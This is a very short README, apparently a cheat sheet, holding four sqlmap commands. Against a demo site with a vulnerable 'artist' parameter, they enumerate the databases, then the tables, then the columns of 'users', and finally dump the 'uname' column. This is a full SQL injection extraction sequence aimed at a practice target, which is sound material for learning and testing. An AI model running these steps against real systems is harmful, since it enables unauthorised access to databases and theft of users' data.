# sqlmap-dev

``` python sqlmap.py -u http://testphp.vulnweb.com/artists.php\?artist\=1 --dbs ```

``` python sqlmap.py -u http://testphp.vulnweb.com/artists.php\?artist\=1 -D acuart --tables ```

``` python sqlmap.py -u http://testphp.vulnweb.com/artists.php\?artist\=1 -D acuart -T users --columns ```

``` python sqlmap.py -u http://testphp.vulnweb.com/artists.php\?artist\=1 -D acuart -T users -C uname --dump-all ```
